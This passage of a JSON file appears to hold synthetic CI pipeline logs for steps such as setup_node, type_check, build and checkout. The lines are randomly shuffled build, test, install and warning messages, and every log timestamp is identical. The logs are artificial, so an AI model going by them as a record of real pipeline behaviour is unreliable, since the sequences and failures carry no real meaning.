          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_api_health (267ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache hit for key-1893",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Exception: TypeError",
          "Cache hit for key-3099",
          "\u2713 build completed",
          "Exception: TypeError",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-4452",
          "\u2713 build completed",
          "[12:00:26] INFO: Processing request",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Step 9/10: Building",
          "Compiling src/app.ts...",
          "WARNING: express has known vulnerabilities",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "Cache hit for key-8168",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_user_create (22ms)",
          "Compiling src/handler.rs...",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 9/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "FAILED: test_auth_login",
          "  PASS: test_db_connect (394ms)",
          "[12:00:26] INFO: Processing request",
          "Step 6/10: Building",
          "[12:00:26] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "  PASS: test_cache_hit (154ms)",
          "  PASS: test_user_create (56ms)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_cache_hit (369ms)",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Compiling src/utils.go...",
          "\u2717 build failed with exit code 49",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Exception: NullPointerException",
          "Cache hit for key-3274",
          "Installing prettier@5.18.0",
          "Installing webpack@1.18.0",
          "Cache hit for key-6146",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-6301",
          "Compiling src/main.py...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-29T12:00:33.969915",
        "finished_at": "2025-11-29T12:00:39.149317",
        "log_lines": [
          "=== Step: setup_node ===",
          "Installing jest@4.15.0",
          "Step 6/10: Building",
          "Installing express@2.6.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_auth_login (108ms)",
          "\u2713 lint completed",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_cache_hit (262ms)",
          "  PASS: test_auth_login (221ms)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Compiling src/handler.rs...",
          "[12:00:26] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Step 8/10: Building",
          "  PASS: test_user_create (292ms)",
          "Compiling src/service.java...",
          "Cache hit for key-7142",
          "Cache hit for key-6369",
          "[12:00:26] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Compiling src/utils.go...",
          "Cache hit for key-4879",
          "Cache hit for key-7323",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:26] WARN: Deprecated API usage",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 lint completed",
          "Installing express@4.20.0",
          "Step 9/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u2713 test completed",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:26] INFO: Processing request",
          "Installing webpack@3.13.0",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_user_create (485ms)",
          "\u2713 build completed",
          "\u2713 test completed",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_auth_login (293ms)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing lodash@1.12.0",
          "[12:00:26] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing prettier@4.2.0",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Installing axios@1.13.0",
          "Cache hit for key-7760",
          "[12:00:26] WARN: Deprecated API usage",
          "Installing lodash@5.4.0",
          "Cache hit for key-1927",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_api_health (347ms)",
          "Cache hit for key-2911",
          "\u2713 build completed",
          "Installing express@3.18.0",
          "Cache hit for key-7311",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Compiling src/app.ts...",
          "WARNING: react has known vulnerabilities",
          "Compiling src/utils.go...",
          "Installing prettier@4.10.0",
          "Step 10/10: Building",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "  PASS: test_db_connect (247ms)",
          "Compiling src/index.js...",
          "Installing prettier@1.17.0",
          "[12:00:26] WARN: Deprecated API usage",
          "Installing react@4.15.0",
          "Installing prettier@1.18.0",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "[12:00:26] ERROR: Connection failed",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "[12:00:26] INFO: Processing request",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Cache hit for key-4653",
          "  PASS: test_auth_login (309ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:00:26] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (23MB)",
          "[12:00:26] INFO: Processing request",
          "Installing react@4.12.0",
          "[12:00:26] WARN: Deprecated API usage",
          "  PASS: test_auth_login (326ms)",
          "Compiling src/handler.rs...",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_user_create (210ms)",
          "\u2713 build completed",
          "[12:00:26] INFO: Processing request",
          "Step 7/10: Building",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_db_connect (24ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 test completed",
          "Exception: RuntimeError",
          "  PASS: test_db_connect (461ms)",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u2713 test completed",
          "Installing axios@5.12.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "Installing jest@3.1.0",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_api_health (373ms)",
          "  PASS: test_db_connect (18ms)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache hit for key-4358",
          "\u2713 build completed",
          "Cache hit for key-6377",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (474ms)",
          "Installing eslint@4.14.0",
          "Installing react@5.17.0",
          "Cache hit for key-9469",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing react@5.12.0",
          "  PASS: test_cache_hit (421ms)",
          "WARNING: react has known vulnerabilities",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:26] WARN: Deprecated API usage",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:26] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Cache hit for key-5708",
          "\u2713 test completed",
          "\u2713 test completed",
          "[12:00:26] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_cache_hit (37ms)",
          "[12:00:26] INFO: Processing request",
          "Installing express@1.14.0",
          "Installing lodash@3.12.0",
          "  PASS: test_user_create (454ms)",
          "Cache hit for key-1915",
          "Compiling src/utils.go...",
          "[12:00:26] INFO: Processing request",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-29T12:00:39.149317",
        "finished_at": "2025-11-29T12:00:44.328719",
        "log_lines": [
          "=== Step: type_check ===",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_api_health (145ms)",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "Installing eslint@4.17.0",
          "Step 4/10: Building",
          "  PASS: test_auth_login (134ms)",
          "\u2713 build completed",
          "[12:00:26] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 4/10: Building",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-1740",
          "Cache hit for key-9993",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (282ms)",
          "WARNING: eslint has known vulnerabilities",
          "[12:00:26] INFO: Processing request",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "\u2713 build completed",
          "Installing lodash@4.16.0",
          "\u2713 build completed",
          "  PASS: test_cache_hit (261ms)",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-6058",
          "Installing webpack@3.0.0",
          "Exception: ValueError",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (45MB)",
          "  PASS: test_db_connect (437ms)",
          "[12:00:26] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "  PASS: test_api_health (469ms)",
          "Compiling src/service.java...",
          "  PASS: test_api_health (321ms)",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "[12:00:26] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (35MB)",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_db_connect (397ms)",
          "Exception: NullPointerException",
          "  PASS: test_db_connect (327ms)",
          "  PASS: test_user_create (466ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_auth_login (74ms)",
          "Step 6/10: Building",
          "Step 8/10: Building",
          "Installing axios@4.7.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing axios@1.12.0",
          "Cache hit for key-8732",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (43MB)",
          "[12:00:26] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "Installing webpack@5.6.0",
          "[12:00:26] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Step 7/10: Building",
          "Installing express@4.5.0",
          "\u2713 test completed",
          "  PASS: test_cache_hit (15ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:26] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 lint completed",
          "  PASS: test_api_health (257ms)",
          "Step 9/10: Building",
          "Cache hit for key-5518",
          "Step 10/10: Building",
          "Compiling src/index.js...",
          "Step 9/10: Building",
          "Step 5/10: Building",
          "  PASS: test_db_connect (399ms)",
          "Installing express@3.12.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "\u2713 build completed",
          "Installing webpack@2.0.0",
          "Step 5/10: Building",
          "Installing express@4.20.0",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (52ms)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Step 6/10: Building",
          "\u2717 build failed with exit code 29",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Installing eslint@4.12.0",
          "Step 10/10: Building",
          "[12:00:26] INFO: Processing request",
          "Installing react@1.14.0",
          "  PASS: test_api_health (174ms)",
          "  PASS: test_db_connect (233ms)",
          "[12:00:26] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "[12:00:26] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-4764",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_auth_login (244ms)",
          "[12:00:26] INFO: Processing request",
          "Installing lodash@5.6.0",
          "  PASS: test_auth_login (450ms)",
          "Installing webpack@2.5.0",
          "Exception: NullPointerException",
          "  PASS: test_cache_hit (496ms)",
          "[12:00:26] INFO: Processing request",
          "Step 1/10: Building",
          "Cache hit for key-2845",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing express@2.19.0",
          "[12:00:26] WARN: Deprecated API usage",
          "Cache hit for key-4119",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_cache_hit (495ms)",
          "  PASS: test_user_create (299ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:26] INFO: Processing request",
          "Installing axios@4.5.0",
          "  PASS: test_auth_login (125ms)",
          "  PASS: test_auth_login (435ms)",
          "\u2717 build failed with exit code 65",
          "Installing eslint@2.11.0",
          "Cache hit for key-1466",
          "Installing react@4.16.0",
          "Installing lodash@5.14.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 build completed",
          "\u2713 test completed",
          "  PASS: test_cache_hit (253ms)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_db_connect (84ms)",
          "Cache hit for key-2343",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "[12:00:26] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-2003",
          "\u2713 test completed",
          "WARNING: axios has known vulnerabilities",
          "\u2713 test completed",
          "  PASS: test_api_health (411ms)",
          "Step 2/10: Building",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-8036",
          "Step 10/10: Building",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-8492",
          "[12:00:26] INFO: Processing request",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Exception: TypeError",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-29T12:00:44.328719",
        "finished_at": "2025-11-29T12:00:59.866924",
        "log_lines": [
          "=== Step: build ===",
          "Installing axios@1.16.0",
          "  PASS: test_api_health (108ms)",
          "  PASS: test_cache_hit (67ms)",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Step 3/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:26] INFO: Processing request",
          "Installing express@4.3.0",
          "Cache hit for key-5693",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:26] INFO: Processing request",
          "Installing lodash@5.1.0",
          "Installing eslint@2.9.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:26] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Compiling src/app.ts...",
          "Step 9/10: Building",
          "Installing jest@5.17.0",
          "[12:00:26] INFO: Processing request",
          "Step 10/10: Building",
          "Installing express@2.0.0",
          "Artifact uploaded: build.tar.gz (44MB)",
          "  PASS: test_user_create (145ms)",
          "WARNING: eslint has known vulnerabilities",
          "Cache hit for key-8629",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_auth_login (46ms)",
          "WARNING: webpack has known vulnerabilities",
          "  PASS: test_user_create (28ms)",
          "  PASS: test_auth_login (133ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "  PASS: test_db_connect (279ms)",
          "Installing lodash@5.3.0",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-7278",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_user_create (447ms)",
          "Installing jest@1.5.0",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Cache hit for key-1327",
          "  PASS: test_db_connect (485ms)",
          "[12:00:26] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:26] INFO: Processing request",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Compiling src/main.py...",
          "Installing eslint@1.13.0",
          "Cache hit for key-3360",
          "  PASS: test_cache_hit (403ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Installing webpack@3.20.0",
          "Step 7/10: Building",
          "[12:00:26] INFO: Processing request",
          "Installing react@1.9.0",
          "Installing prettier@1.10.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u2713 build completed",
          "  PASS: test_api_health (216ms)",
          "FAILED: test_db_connect",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (40MB)",
          "[12:00:26] INFO: Processing request",
          "Installing express@5.16.0",
          "Installing express@5.9.0",
          "Installing react@5.6.0",
          "[12:00:26] INFO: Processing request",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing axios@2.20.0",
          "FAILED: test_user_create",
          "  PASS: test_cache_hit (210ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (392ms)",
          "  PASS: test_user_create (129ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing express@5.7.0",
          "[12:00:26] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/utils.go...",
          "Cache hit for key-7662",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "[12:00:26] INFO: Processing request",
          "Exception: NullPointerException",
          "\u2713 build completed",
          "[12:00:26] INFO: Processing request",
          "Installing axios@4.4.0",
          "Installing jest@2.0.0",
          "Cache hit for key-7619",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Exception: NullPointerException",
          "Compiling src/service.java...",
          "Exception: ValueError",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 test completed",
          "Step 6/10: Building",
          "Cache hit for key-4774",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (328ms)",
          "Compiling src/app.ts...",
          "Step 5/10: Building",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:26] INFO: Processing request",
          "Compiling src/main.py...",
          "  PASS: test_user_create (309ms)",
          "Installing lodash@4.14.0",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (11MB)",
          "  PASS: test_cache_hit (242ms)",
          "Installing react@4.9.0",
          "\u2713 lint completed",
          "[12:00:26] INFO: Processing request",
          "Step 2/10: Building",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-1108",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u2713 build completed",
          "Cache hit for key-2210",
          "Installing prettier@4.9.0",
          "[12:00:26] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-8939",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:26] INFO: Processing request",
          "Installing axios@5.13.0",
          "\u2713 build completed",
          "WARNING: webpack has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-1646",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing axios@3.19.0",
          "Artifact uploaded: build.tar.gz (13MB)",
          "  PASS: test_user_create (288ms)",
          "Compiling src/service.java...",
          "Cache hit for key-8320",
          "Installing express@5.0.0",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-6420",
          "  PASS: test_cache_hit (276ms)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing axios@2.15.0",
          "[12:00:26] INFO: Processing request",
          "Installing jest@5.6.0",
          "[12:00:26] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "[12:00:26] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-29T12:00:59.866924",
        "finished_at": "2025-11-29T12:01:05.046326",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-3184",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (369ms)",
          "Step 2/10: Building",
          "Cache hit for key-5081",
          "\u2713 lint completed",
          "Cache hit for key-1266",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:26] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing webpack@5.5.0",
          "Compiling src/utils.go...",
          "[12:00:26] WARN: Deprecated API usage",
          "\u2713 build completed",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_cache_hit (410ms)",
          "Step 3/10: Building",
          "  PASS: test_db_connect (50ms)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Compiling src/index.js...",
          "Installing webpack@3.19.0",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-9710",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_api_health (116ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "  PASS: test_db_connect (480ms)",
          "[12:00:26] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Installing jest@5.1.0",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-9675",
          "Installing jest@4.4.0",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Installing prettier@2.9.0",
          "Installing react@1.2.0",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "\u2713 test completed",
          "Step 9/10: Building",
          "  PASS: test_db_connect (279ms)",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-5618",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Installing lodash@2.3.0",
          "Step 5/10: Building",
          "Cache hit for key-1100",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (272ms)",
          "Step 2/10: Building",
          "Installing prettier@1.17.0",
          "\u2713 build completed",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-5515",
          "[12:00:26] INFO: Processing request",
          "Compiling src/app.ts...",
          "Cache hit for key-6441",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Installing eslint@4.15.0",
          "[12:00:26] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Step 9/10: Building",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_cache_hit (258ms)",
          "FAILED: test_user_create",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Installing eslint@5.5.0",
          "Step 5/10: Building",
          "Cache hit for key-7113",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Installing express@2.17.0",
          "Step 3/10: Building",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:26] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "[12:00:26] INFO: Processing request",
          "Installing jest@4.7.0",
          "Step 9/10: Building",
          "  PASS: test_auth_login (316ms)",
          "  PASS: test_api_health (122ms)",
          "Installing eslint@3.17.0",
          "Exception: ValueError",
          "  PASS: test_api_health (344ms)",
          "[12:00:26] INFO: Processing request",
          "Installing axios@5.5.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:26] INFO: Processing request",
          "Installing prettier@4.15.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "\u2713 test completed",
          "  PASS: test_user_create (485ms)",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (27ms)",
          "[12:00:26] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (447ms)",
          "Installing jest@4.9.0",
          "Step 4/10: Building",
          "Step 8/10: Building",
          "Cache hit for key-2856",
          "Compiling src/service.java...",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_db_connect (176ms)",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "\u2713 build completed",
          "WARNING: axios has known vulnerabilities",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Compiling src/index.js...",
          "Step 4/10: Building",
          "  PASS: test_db_connect (294ms)",
          "Cache hit for key-4981",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_api_health (250ms)",
          "Compiling src/utils.go...",
          "WARNING: lodash has known vulnerabilities",
          "\u2713 lint completed",
          "Cache hit for key-7130",
          "Cache hit for key-9431",
          "Installing jest@3.17.0",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Exception: TypeError",
          "Compiling src/main.py...",
          "  PASS: test_api_health (376ms)",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/index.js...",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:00:26] ERROR: Connection failed",
          "Step 9/10: Building",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 build completed",
          "  PASS: test_db_connect (444ms)",
          "Compiling src/app.ts...",
          "Installing react@2.9.0",
          "Cache hit for key-4392",
          "Cache hit for key-9884",
          "Artifact uploaded: build.tar.gz (12MB)",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_user_create (451ms)",
          "Installing react@4.4.0",
          "Cache hit for key-4476",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Exception: TypeError",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_api_health (179ms)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_user_create (124ms)",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-29T12:01:05.046326",
        "finished_at": "2025-11-29T12:01:07.118087",
        "log_lines": [
          "=== Step: checkout ===",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:26] INFO: Processing request",
          "Installing webpack@1.19.0",
          "\u2713 build completed",
          "Cache hit for key-3039",
          "FAILED: test_user_create",
          "Compiling src/index.js...",
          "Installing lodash@2.4.0",
          "Cache hit for key-1575",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "[12:00:26] INFO: Processing request",
          "Step 10/10: Building",
          "[12:00:26] INFO: Processing request",
          "Step 3/10: Building",
          "Installing lodash@3.6.0",
          "  PASS: test_user_create (1ms)",
          "Step 8/10: Building",
          "Installing webpack@3.10.0",
          "  PASS: test_cache_hit (372ms)",
          "Step 2/10: Building",
          "Cache hit for key-6435",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Installing webpack@1.12.0",
          "[12:00:26] INFO: Processing request",
